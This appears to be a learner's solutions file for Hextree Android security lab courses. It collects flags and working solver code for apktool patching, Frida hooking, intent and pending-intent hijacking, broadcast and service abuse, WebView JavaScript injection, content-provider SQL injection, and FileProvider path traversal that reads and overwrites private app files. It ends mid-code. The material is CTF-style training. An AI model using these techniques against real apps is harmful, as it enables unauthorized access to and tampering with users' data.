

```bash
# https://app.hextree.io/courses/research-device-setup/the-android-debug-bridge-adb/managing-apps
# Flag1: HXT{Ready-to-Android}
am start-activity -a android.intent.action.MAIN io.hextree.adbtestapplication/.MainActivity
# Flag2: HXT{not-so-hidden-activity}
am start-activity -a android.intent.action.QUICK_VIEW io.hextree.adbtestapplication/.HiddenActivity

# Logcat flag: HXT{log-all-the-cats}
```

https://app.hextree.io/courses/first-android-app/debugging-and-sharing/sharing-app-code-via-git
`HXT{read-or-modify-sources-gha82f}`

```bash
# https://app.hextree.io/courses/reverse-android-apps/working-with-apks-and-apktool/extracting-apks-with-apktool
am start io.hextree.reversingexample/.SecretActivity # HXT{A-not-so-secret-activity}

apktool d io.hextree.reversingexample.apk
apktool b -o io.hextree.reversingexample.patched.apk io.hextree.reversingexample
uber-apk-signer --apks io.hextree.reversingexample.patched.apk

adb uninstall io.hextree.reversingexample
adb install io.hextree.reversingexample.patched-aligned-debugSigned.apk

# Make the `io.hextree.reversingexample.UnreachableActivity` exported="true"
am start io.hextree.reversingexample/.UnreachableActivity # HXT{I-thought-I-am-unreachable}

# HXT{hardcoded-secrets-are-bad}
# HXT{resources-are-no-match-for-me}
# HXT{from-java-to-native}
```

```bash
# https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/the-hextree-weather-app

apktool b -o io.hextree.weatherusa.patched.apk io.hextree.weatherusa
uber-apk-signer --apks io.hextree.weatherusa.patched.apk
adb install io.hextree.weatherusa.patched-aligned-debugSigned.apk

# zip codes valid: 13337 or 42
# Make the app send a request with ZIP code "42", bypassing the client-side `zipcode.length() == 5` check: HXT{android-api-h192gsa0}
# hardcoded secret: `<string name="ApiKey">HXT{android-api-key-b1872g}</string>`
```


https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/diffing-application-updates
```js
// Step 1: Use `jadx file0.apk -d app0`
// Step 2: Use `jadx file1.apk -d app1`
// Setp 3: Use a folder comparator to comapre decompiled code
// Step 4: frida -U -f io.hextree.weatherusa -l agent.js
Java.perform(function() {   
    Java.use("io.hextree.weatherusa.InternetUtil").a("foo", "bar") //force library to be loaded
    let res = Java.use("io.hextree.weatherusa.InternetUtil").getKey("moiba1cybar8smart4sheriff4securi") //HXT{obfuscated-api-key-asb126us}
    console.log(`${res}`)
})
```

```js
// https://app.hextree.io/courses/android-dynamic-instrumentation/frida-basics-q9/mixing-static-and-dynamic-analysis-javap
Java.perform(function() {
    let FlagClass = Java.use("io.hextree.fridatarget.FlagClass");
    console.log(FlagClass.flagFromStaticMethod()) //HXT{a-static-calling-with-frida}

    let FlagClassInstance = FlagClass.$new()
    console.log(FlagClassInstance.flagFromInstanceMethod()) //HXT{dynamic-droid}

    console.log(FlagClassInstance.flagIfYouCallMeWithSesame("sesame")) //HXT{the-droid-youre-looking-for}
})
```

```bash
# https://app.hextree.io/courses/android-dynamic-instrumentation/tracing-with-frida/frida-trace
# Make sure to click around before attaching so that the classes can be found by frida-trace
frida-trace -U FridaTarget -j 'io.hextree.*!*' # HXT{I-take-door-6}

frida-trace -U FridaTarget -j 'io.hextree.*!*' -J '*AnnoyingClass!*' # HXT{I-take-door-5}

frida-trace -U FridaTarget -j 'io.hextree.*!*' # HXT{Order-Is-Sometimes-Very-Important}
```

```js
// https://app.hextree.io/courses/android-dynamic-instrumentation/intercepting-arguments-return-values/the-dice-game
Java.use("io.hextree.fridatarget.ui.DiceGameFragment").randomDice.implementation = function () {
  return 5 //HXT{frida-rolling-the-dice}
};

// https://app.hextree.io/courses/android-dynamic-instrumentation/final-challenge-2048
// For recon: frida-trace -U -j 'io.hextree.*!*' HT2048
Java.use("io.hextree.privacyfriendly2048.activities.GameActivity").generateNumber.implementation = function () {
  return 1024; // HXT{2048-is-easy}
};
```


```bash
# https://app.hextree.io/courses/network-interception/android-networking-basics/packet-logging-with-tcpdump
# Folder change is mandatory
cd /home/nikos/Android/Sdk/tools
emulator -tcpdump ~/ctfs/hextree.io/android-course/pockethexmap.pcap -netdelay none -netspeed full -avd Pixel_5_API_31_-_Android_12
# Flag -tcpdump did not work :(
# use adb root + tcpdump + wireshark and then use filter `tcp.payload contains "HXT"`
# HXT{cleartext-traffic-g19g2is}
```


https://app.hextree.io/courses/network-interception/case-study-pockethexmap/static-vs-dynamic-analysis
See `/home/nikos/ctfs/hextree.io/android-course/pockethexmap/writeup.md`
Flag: `HXT{zip-path-traversal-1sg17}`


https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/practice-startactivity
```kotlin
val intent = Intent()
intent.component = ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag1Activity"
)
startActivity(intent) //HXT{basic-exported-activity-1bh7sd}


val intent = Intent()
intent.component = ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag1Activity"
)
intent.action = "io.hextree.action.GIVE_FLAG"
startActivity(intent) // HXT{intent-actions-activity-dsj198w}

val intent = Intent()
intent.component = ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag1Activity"
)
intent.action = "io.hextree.action.GIVE_FLAG"
intent.data = Uri.parse("https://app.hextree.io/map/android")
startActivity(intent) // HXT{intent-uri-data-sda982bs}
```

```bash
# https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/implementing-intent-debug-features
am start-activity -a "init" io.hextree.attacksurface/.activities.Flag4Activity
am start-activity -a "PREPARE_ACTION" io.hextree.attacksurface/.activities.Flag4Activity
am start-activity -a "BUILD_ACTION" io.hextree.attacksurface/.activities.Flag4Activity
am start-activity -a "GET_FLAG_ACTION" io.hextree.attacksurface/.activities.Flag4Activity
am start-activity io.hextree.attacksurface/.activities.Flag4Activity # HXT{sometimes-require-multiple-calls-5133au2}
```

```kotlin
// https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/implementing-intent-debug-features
val flag5Button: Button = findViewById(R.id.flag5Button)
flag5Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
    )
    val nextIntent = Intent()
    nextIntent.putExtra("reason", "back")

    val intent2 = Intent()
    intent2.putExtra("return", 42)
    intent2.putExtra("nextIntent", nextIntent)

    intent.putExtra(
        Intent.EXTRA_INTENT,
        intent2
    )
    startActivity(intent) //HXT{intent-in-intent-in-intent-298abso}
}


flag7Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
    )
    intent.action = "OPEN"
    startActivity(intent)
    Log.i(IntentSolver::class.java.name,  "OPEN sent")
    Executors.newSingleThreadScheduledExecutor().schedule({
        val reopenIntent = Intent()
        reopenIntent.component = ComponentName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag7Activity"
        )
        reopenIntent.action = "REOPEN"
        reopenIntent.flags = reopenIntent.flags or Intent.FLAG_ACTIVITY_SINGLE_TOP
        startActivity(reopenIntent)
        Log.i(IntentSolver::class.java.name,  "REOPEN sent") //HXT{activity-lifecycle-ninja-jhbsa89}
    }, 2, TimeUnit.SECONDS)
}
```


```java
// https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities
val flag6Button: Button = findViewById(R.id.flag6Button)
flag6Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
    )
    val nextIntent = Intent()
    nextIntent.putExtra("reason", "next")
    nextIntent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag6Activity"
    )
    nextIntent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION

    val intent2 = Intent()
    intent2.putExtra("return", 42)
    intent2.putExtra("nextIntent", nextIntent)

    intent.putExtra(
        Intent.EXTRA_INTENT,
        intent2
    )
    startActivity(intent) //HXT{redirect-to-not-exported-n129vbs}
}
```


```kotlin
// https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/returning-activity-results
val flag8Button: Button = findViewById(R.id.flag8Button)
flag8Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "com.example.hetreepoc",
        "com.example.hetreepoc.Flag8ActivityHextree"
    )
    startActivity(intent)
}
package com.example.hetreepoc
class Flag8ActivityHextree : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val intent = Intent()
        intent.component = ComponentName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag8Activity"
        )
        startActivityForResult(intent, 1337) //HXT{no-expected-return-ds282ba}
    }
    @Override
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
    }
}

val flag9Button: Button = findViewById(R.id.flag9Button)
flag9Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "com.example.hetreepoc",
        "com.example.hetreepoc.Flag9ActivityHextree"
    )
    startActivity(intent)
}
package com.example.hetreepoc
class Flag9ActivityHextree : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_flag9_hextree)
        val intent = Intent()
        intent.component = ComponentName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag9Activity"
        )
        startActivityForResult(intent, 1337)
    }
    @Override
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if(requestCode == 1337) {
            Utils.showDialog(this, data)
            val flag = data?.getStringExtra("flag")
            Log.i(Flag9ActivityHextree::class.java.name, "flag: $flag") //HXT{flag-in-result-gs891jh2}
        }
    }
}
```

https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/hijack-implicit-intents
```xml
<!-- AndroidManifest.xml -->
<activity
    android:name=".IntentSolver"
    android:exported="true">

    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```
```kotlin
val flag12Button: Button = findViewById(R.id.flag12Button)
flag12Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag12Activity"
    )
    intent.action = null
    intent.putExtra("LOGIN", true)
    startActivity(intent)
}

//return true if caller should call `finish()`
private fun handleReceivedIntent(): Boolean {
    if(intent == null)
        return false

    if(intent.action == "io.hextree.attacksurface.ATTACK_ME") {
        if(callingActivity == null) {
            Log.i(IntentSolver::class.java.name, "flag: ${intent.getStringExtra("flag")}") //HXT{hijacked-intent-with-flag-dsui2908}
            return false
        } else {
            if("Flag11Activity" in callingActivity!!.className) {
                val resultIntent = Intent()
                resultIntent.putExtra("token", 0x41414141)
                setResult(RESULT_OK, resultIntent) //HXT{sent-back-result-1897djh}
                return true
            }
            if("Flag12Activity" in callingActivity!!.className) {
                val resultIntent = Intent()
                resultIntent.putExtra("token", 0x41414141)
                setResult(RESULT_OK, resultIntent) //HXT{tricky-intent-condition-bjhs782}
                return true
            }
        }
    }
    return false
}
```

```kotlin
// https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/delegation-via-pending-intents
flag22Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag22Activity"
    )

    val intentToSend = Intent()
    intentToSend.component = ComponentName(
        "com.example.hetreepoc",
        "com.example.hetreepoc.IntentSolver"
    )
    intentToSend.action = "Flag22"

    val pendingIntent = PendingIntent.getActivity(this, RC_FLAG_22, intentToSend, PendingIntent.FLAG_IMMUTABLE)
    intent.putExtra("PENDING", pendingIntent)
    startActivity(intent)

    //I send `intent`
    //App receives it and extracts the `pendingIntent`
    //App then invokes my pending intent which launches an activity as described by `intentToSend`
    //App also passes additional data to the `intentToSend` as you see in the decompilation. So, it mutates the Intent
    //My app handles the received intent and reads the flag
}
private fun handleReceivedIntent() {
    if(intent.action == "Flag22") {
        Log.i(IntentSolver::class.java.name, "flag: ${intent.getStringExtra("flag")}") //HXT{received-mutable-flags-xa81b}
    } else if(intent.action == "io.hextree.attacksurface.MUTATE_ME") {
        val pendingIntent = intent.getParcelableExtra<PendingIntent>("pending_intent")!!
        val mutableIntent = Intent()
        //The contents of `mutableIntent` will be copied to the `pendingIntent` only
        //where fields are not defined by out `mutableIntent`
        //e.g. `mutableIntent.action = "lalala"` would be ignored
        mutableIntent.putExtra("code", 42)
        pendingIntent.send(this, RC_FLAG_23, mutableIntent) //HXT{teenage-mutable-intent-turtles-s2df}
    }
}
```

```bash
# https://app.hextree.io/courses/intent-threat-surface/android-deep-links/browser-to-app-attack-surface
am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'hex://flag?action=give-me' -f 8 # HXT{browser-link-or-app2app-s82h}
```

```kotlin
// https://app.hextree.io/courses/intent-threat-surface/android-deep-links/hijacking-deep-link-intents
if(intent.action == "android.intent.action.VIEW") {
    val uri = intent.data
    if(uri != null && uri.scheme == "hex" && uri.host == "token") {
        val newIntent = Intent()
        newIntent.fillIn(intent,
            Intent.FILL_IN_DATA or Intent.FILL_IN_ACTION or Intent.FILL_IN_CATEGORIES
        )
        newIntent.component = ComponentName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag14Activity"
        )
        newIntent.data = Uri.parse(newIntent.dataString!!.replace("type=user", "type=admin"))
        startActivity(newIntent) //Flag: HXT{hijacked-login-token-abjh28a}
    }
}
// Alternatively, we can solve this in Burp
```

https://app.hextree.io/courses/intent-threat-surface/android-deep-links/generic-chrome-intent
Solution: `intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;category=android.intent.category.BROWSABLE;component=io.hextree.attacksurface.activities.Flag15Activity;S.action=flag;B.flag=true;end;`
  * We use `intent:#Intent` instead of `intent://my_host#Intent`. This is because the AndroidManifest.xml of our target app does not have an `android:host` in its `intent-filter`
  * `com.android.browser.application_id` is automatically added by the browser
  * Flag `HXT{intent-uris-are-cool-12fgv}`
  * You can launch chrome with a webpage that does the redirect:
    ```bash
    am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=intent%3A%23Intent%3Bpackage%3Dio%2Ehextree%2Eattacksurface%3Baction%3Dio%2Ehextree%2Eaction%2EGIVE%5FFLAG%3Bcategory%3Dandroid%2Eintent%2Ecategory%2EBROWSABLE%3Bcomponent%3Dio%2Ehextree%2Eattacksurface%2Eactivities%2EFlag15Activity%3BS%2Eaction%3Dflag%3BB%2Eflag%3Dtrue%3Bend%3B'
    ```


```java
// https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/sending-broadcasts
val flag16Button: Button = findViewById(R.id.flag16Button)
flag16Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag16Receiver"
    )
    intent.putExtra("flag", "give-flag-16")
    sendBroadcast(intent) //HXT{basic-receiver-ds82s}
}
```

```kotlin
// https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/intercept-and-redirecting-broadcasts
registerReceiver(object: BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val flag = intent!!.getStringExtra("flag")
        Log.i(BroadcastSolver::class.java.name, "flag18: $flag") //HXT{hijacking-broadcast-intent-as91}
        setResult(RESULT_OK, "foobar", Bundle())
    }
}, IntentFilter("io.hextree.broadcast.FREE_FLAG"))


val flag17Button: Button = findViewById(R.id.flag17Button)
flag17Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag17Receiver"
    )
    intent.putExtra("flag", "give-flag-17")
    sendOrderedBroadcast(intent, null, object: BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val resultExtras: Bundle = getResultExtras(true)
            Log.i(BroadcastSolver::class.java.name, "resultCode: $resultCode, resultData: $resultData")
            Log.i(BroadcastSolver::class.java.name, Utils.dumpBundle(resultExtras)) //HXT{returned-result-ds82s}
            Log.i(BroadcastSolver::class.java.name, Utils.dumpIntent(context, intent)) //same as the one sent
        }
    }, null, RESULT_OK, null, null)
}
```

```kotlin
// https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts
val flag19Button: Button = findViewById(R.id.flag19Button)
flag19Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag19Widget"
    )
    intent.action = "lalala_APPWIDGET_UPDATE_1337"
    val bundle = Bundle()
    bundle.putInt("appWidgetMaxHeight", 0x41414141)
    bundle.putInt("appWidgetMinHeight", 0x13371337)
    intent.putExtra("appWidgetOptions", bundle)
    sendBroadcast(intent) //HXT{exposed-widget-receiver-xz7bs}
}
```


```kotlin
// https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts/the-notification-system
registerReceiver(object: BroadcastReceiver() {
    @SuppressLint("UnsafeIntentLaunch")
    override fun onReceive(context: Context?, intent: Intent?) {
        Log.i(BroadcastSolver::class.java.name, "Flag20 interceptor")
        if(intent!!.getBooleanExtra("interceptor", false))
            return //avoid recursion
        val newintent = Intent()
        newintent.action = "io.hextree.broadcast.GET_FLAG"
        newintent.putExtra("give-flag", true)
        newintent.putExtra("interceptor", true)
        sendBroadcast(newintent) //HXT{spoof-notificaiton-result-er12d}
    }
}, IntentFilter("io.hextree.broadcast.GET_FLAG"))

registerReceiver(object: BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val flag = intent!!.getStringExtra("flag")
        Log.i(BroadcastSolver::class.java.name, "Flag21: $flag") //HXT{intercepted-notificaiton-ah2us}
    }
}, IntentFilter("io.hextree.broadcast.GIVE_FLAG"))
```

```kotlin
// https://app.hextree.io/courses/android-services/service-threat-surface/starting-a-service
val flag24Button: Button = findViewById(R.id.flag24Button)
flag24Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.services.Flag24Service"
    )
    intent.action = "io.hextree.services.START_FLAG24_SERVICE"
    startService(intent) //HXT{basic-service-ha98sl}
}

val flag25Button: Button = findViewById(R.id.flag25Button)
var flag25Counter = 0
flag25Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.services.Flag25Service"
    )
    val lock = (flag25Counter++ % 3) + 1
    intent.action = "io.hextree.services.UNLOCK$lock"
    startService(intent) //HXT{only-one-running-service-1hasu}
}
```

```kotlin
// https://app.hextree.io/courses/android-services/bound-services/message-handler-service
val flag26Button: Button = findViewById(R.id.flag26Button)
flag26Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.services.Flag26Service"
    )
    val boundService = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            val serviceMessenger = Messenger(service)
            val msg = Message.obtain(null, 42)
            serviceMessenger.send(msg) //HXT{message-say-whaaaat-aug2is}
        }

        override fun onServiceDisconnected(name: ComponentName?) { }
    }
    bindService(intent, boundService, BIND_AUTO_CREATE)
}

val flag27Button: Button = findViewById(R.id.flag27Button)
flag27Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.services.Flag27Service"
    )
    bindService(intent, object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            val serviceMessenger = Messenger(service)
            val msg1 = Message.obtain(null, 1)
            msg1.data.putString("echo", "give flag")
            serviceMessenger.send(msg1)

            val msg2 = Message.obtain(null, 2)
            msg2.obj = Message()
            msg2.replyTo = Messenger(object : Handler(Looper.getMainLooper()) {
                override fun handleMessage(reply: Message) {
                    super.handleMessage(reply)
                    val password = reply.data.getString("password")
                    val replyStr = reply.data.getString("reply")
                    Log.i(ServiceSolver::class.java.name, "$reply\npassword: $password, replyStr: $replyStr")
                    if (password != null) {
                        val msg3 = Message.obtain(null, 3)
                        msg3.data = Bundle().also { it.putString("password", password) }
                        msg3.replyTo = Messenger(Handler(Looper.getMainLooper())) // ignore reply as it has no flag
                        serviceMessenger.send(msg3) //HXT{service-messages-js71h}
                    }
                }
            })
            serviceMessenger.send(msg2)
        }

        override fun onServiceDisconnected(name: ComponentName?) { }
    }, BIND_AUTO_CREATE)
}


// https://app.hextree.io/courses/android-services/bound-services/bind-to-aidl-service-with-aidl-file
var aidlService: IFlag28Interface? = null
val aidlServiceConnection = object : ServiceConnection {

  override fun onServiceConnected(className: ComponentName, service: IBinder) {
    // This is called when the connection with the service is
    // established, giving us the service object we can use to
    // interact with the service.  We are communicating with the
    // service through an AIDL interface, so get a client-side
    // representation of that from the raw service object.
    Log.i("aidlServiceConnection", "onServiceConnected")
    aidlService = IFlag28Interface.Stub.asInterface(service)
    val res = aidlService?.openFlag()
    Log.i("aidlServiceConnection", "openFlag result: $res")
  }

  override fun onServiceDisconnected(className: ComponentName) {
    // This is called when the connection with the service is
    // unexpectedly disconnected - that is, its process crashed.
    Log.i("aidlServiceConnection", "onServiceDisconnected")
    aidlService = null
  }
}

val intent = Intent()
intent.component = ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.services.Flag28Service"
)
bindService(intent, aidlServiceConnection, BIND_AUTO_CREATE) //HXT{bound-aidl-service-sdf2ds}


var aidlService: IFlag29Interface?
val aidlServiceConnection = object : ServiceConnection {
    override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
        Log.i("aidlServiceConnection", "onServiceConnected")
        aidlService = IFlag29Interface.Stub.asInterface(service)
        val pw = aidlService!!.init()
        Log.i("aidlServiceConnection", "password: $pw")
        aidlService!!.authenticate(pw)
        aidlService!!.success()
    }

    override fun onServiceDisconnected(name: ComponentName?) {
        Log.i("aidlServiceConnection", "onServiceDisconnected")
        aidlService = null
    }
}
val intent = Intent()
intent.component = ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.services.Flag29Service"
)
bindService(intent, aidlServiceConnection, BIND_AUTO_CREATE) //HXT{ai-ai-aidl-service-a2si1}
```


```kotlin
// https://app.hextree.io/courses/android-webview/android-webviews/addjavascriptinterface
val intent = Intent()
intent.component = ComponentName(
    "io.hextree.webviewdemo",
    "io.hextree.webviewdemo.MainActivity"
)
val maliciousWebPage =
"""
<html>
    <body>
        <p> Hello World! </p>
        <script>
            console.log("Executing javascript")
            //Android.showToast("Javascript can execute Java!")
            Android.showFlag()
        </script>
    </body>
</html>
"""
intent.putExtra("htmlContent", maliciousWebPage)
startActivity(intent) //HXT{java-in-a-webview}
```


```java
// https://app.hextree.io/courses/content-provider/introduction-to-provider/reverse-engineering-sqlite-contentprovid
public static String dumpContentProvider(ContentResolver contentResolver, Uri uri) {
    Cursor cursor = contentResolver.query(uri, null, null, null, null);
    String res = dumpContentProvider(cursor);
    if(cursor != null)
        cursor.close();
    return res;
}

public static String dumpContentProvider(Cursor cursor) {
    if(cursor == null)
        return "";

    StringBuilder sb = new StringBuilder();
    if (cursor.moveToFirst()) {
        do {
            StringBuilder rowsb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (rowsb.length() > 0) {
                    rowsb.append(", ");
                }
                rowsb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
            }
            sb.append(rowsb).append('\n');
        } while (cursor.moveToNext());
    }
    cursor.moveToFirst();
    return sb.toString().trim();
}
```
```kotlin
// https://app.hextree.io/courses/content-provider/introduction-to-provider/reverse-engineering-sqlite-contentprovid (continued)
val flag30Button: Button = findViewById(R.id.flag30Button)
flag30Button.setOnClickListener {
    val authority = "io.hextree.flag30"
    val cursor = contentResolver.query(
        Uri.parse("content://$authority/success"),
        null, null, null, null
    )
    Log.i(ContentProviderSolver::class.java.name, Utils.dumpContentProvider(cursor))
    cursor?.close() //HXT{query-provider-table-1vsd8}
}
val flag31Button: Button = findViewById(R.id.flag31Button)
flag31Button.setOnClickListener {
    val authority = "io.hextree.flag31"
    val cursor = contentResolver.query(
        Uri.parse("content://$authority/flag/31"),
        null, null, null, null
    )
    Log.i(ContentProviderSolver::class.java.name, Utils.dumpContentProvider(cursor))
    cursor?.close() //HXT{query-uri-matcher-sakj1}
}
```

```kotlin
// https://app.hextree.io/courses/content-provider/introduction-to-provider/sql-injection-in-content-providers
val flag32Button: Button = findViewById(R.id.flag32Button)
flag32Button.setOnClickListener {
    val authority = "io.hextree.flag32"
    val selection = "1=1) OR visible=0 -- -" //Result: `visible=1 AND (1=1) OR visible=0 -- -)`
    val cursor = contentResolver.query(
        Uri.parse("content://$authority/flags"),
        null, selection, null, null
    )
    Log.i(ContentProviderSolver::class.java.name, Utils.dumpContentProvider(cursor))
    cursor?.close() //HXT{sql-injection-in-provider-1gs82}
}
```

```kotlin
// https://app.hextree.io/courses/content-provider/grant_read_uri_permission
    val FLAG_33_1_RC = 331
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //...
        val flag33_1Button: Button = findViewById(R.id.flag33_1Button)
        flag33_1Button.setOnClickListener {
            val intent = Intent()
            intent.component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag33Activity1"
            )
            intent.action = "io.hextree.FLAG33"
            //victim app sets the FLAG_GRANT_READ_URI_PERMISSION flag and the Intent's data
            startActivityForResult(intent, FLAG_33_1_RC)
        }

        val shouldFinish = handleReceivedIntent()
        if(shouldFinish)
            finish()
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if(requestCode == FLAG_33_1_RC) {
            Log.i("flag33_1", Utils.dumpIntent(this, data)) //contains FLAG_GRANT_READ_URI_PERMISSION
            // val maliciousProjection = arrayOf("* FROM sqlite_master; -- -")
            val maliciousProjection = arrayOf("* FROM Note; -- -")
            val cursor = contentResolver.query(
                data!!.data!!,
                maliciousProjection, null, null, null
            )
            Log.i("flag33_1", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{union-select-injection-1bs98}
        }
    }

    private fun handleReceivedIntent(): Boolean {
        if (intent.action == "io.hextree.FLAG33" && intent.data.toString() == "content://io.hextree.flag33_2/flags") {
            assert(intent.flags and Intent.FLAG_GRANT_READ_URI_PERMISSION == Intent.FLAG_GRANT_READ_URI_PERMISSION)
            val maliciousProjection = arrayOf("* FROM Note; -- -")
            val cursor = contentResolver.query(
                intent.data!!,
                maliciousProjection, null, null, null
            )
            Log.i("flag33_2", Utils.dumpContentProvider(cursor))
            cursor?.close() //HXT{union-select-injection-1bs98}
            return false
        }

        return false
    }
```

```kotlin
// https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/how-to-access-fileprovider
val flag34Button: Button = findViewById(R.id.flag34Button)
flag34Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag34Activity"
    )
    intent.putExtra("filename", "flags/flag34.txt")
    startActivityForResult(intent, FLAG_34_RC)
}

override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)
    if(requestCode == FLAG_34_RC) {
        Log.i("flag34", Utils.dumpIntent(this, data))
        val fd = contentResolver.openFileDescriptor(data!!.data!!, "r")
        if(fd != null ) {
            val bufferedReader = BufferedReader(FileReader(fd.fileDescriptor))
            val fileContents = bufferedReader.readText()
            bufferedReader.close()
            fd.close()
            Log.i("flag34", "fileContents:\n${fileContents}") //HXT{sharing-filedescriptors-av27s}
        }
    }
}
```

```kotlin
// https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/insecure-root-path-fileprovider-config
val flag35Button: Button = findViewById(R.id.flag35Button)
flag35Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag35Activity"
    )
    intent.putExtra("filename", "../../../..//data/data/io.hextree.attacksurface/flag35.txt")
    startActivityForResult(intent, FLAG_35_RC)
}
override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)
    if(requestCode == FLAG_35_RC) {
        Log.i("flag35", Utils.dumpIntent(this, data))
        val fd = contentResolver.openFileDescriptor(data!!.data!!, "r")
        if(fd != null ) {
            val bufferedReader = BufferedReader(FileReader(fd.fileDescriptor))
            val fileContents = bufferedReader.use { it.readText() }
            fd.close()
            Log.i("flag35", "fileContents:\n${fileContents}") //HXT{path-traversal-stealer-s1hw9}
        }
    }
}
```

```kotlin
// https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/fileprovider-write-access

val flag36Button: Button = findViewById(R.id.flag36Button)
flag36Button.setOnClickListener {
    val intent = Intent()
    intent.component = ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag35Activity"
    )
    intent.putExtra("filename", "../../../../data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml")
    startActivityForResult(intent, FLAG_36_RC)
}

override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)
    if(requestCode == FLAG_36_RC) {
        Log.i("flag36", Utils.dumpIntent(this, data))
        val fd = contentResolver.openFileDescriptor(data!!.data!!, "w")
        if(fd != null ) {
            val bufferedWriter = BufferedWriter(FileWriter(fd.fileDescriptor))
            bufferedWriter.use {
                it.write(
                    """
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="solved" value="true" />
</map>
